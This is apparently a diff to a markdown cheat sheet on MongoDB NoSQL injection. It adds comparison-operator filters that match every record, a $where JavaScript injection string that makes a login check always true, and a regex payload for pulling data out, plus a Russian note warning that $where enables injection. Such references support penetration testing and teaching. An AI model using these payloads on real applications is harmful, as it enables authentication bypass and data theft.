@@ -18,3 +18,19 @@
 |Query|Description|
 |-|-|
 |`name: {$ne: 'doesntExist'}`|Assuming doesntExist doesn't match any documents' names, this will match all documents|
+|`name: {$gt: ''}`|This matches all documents whose name is 'bigger' than an empty string|
+|`name: {$gte: ''}`|This matches all documents whose name is 'bigger or equal to' an empty string|
+|`name: {$lt: '~'}`|This compares the first character of name to a Tilde character and matches if it is 'less'. This will not always work, but it works in this case because Tilde is the largest printable ASCII value, and we know that all names in the collection are composed of ASCII characters|
+|`name: {$lte: '~'}`|Same logic as above, except it additionally matches documents whose names start with ~|
+
+## Server-Side JavaScript Injection
+1. Set username to `" || true || ""=="`
+2. The result ```db.users.find({
+    $where: 'this.username === "" || true || ""=="" && this.password === "<password>"'
+});```
+
+### To exfiltrate data
+`" || (this.username.match('^.*')) || ""==" `
+
+## NB
+**Если в приложении вызывается функция `where`, то она потенциально может привести к NoSQLi`**
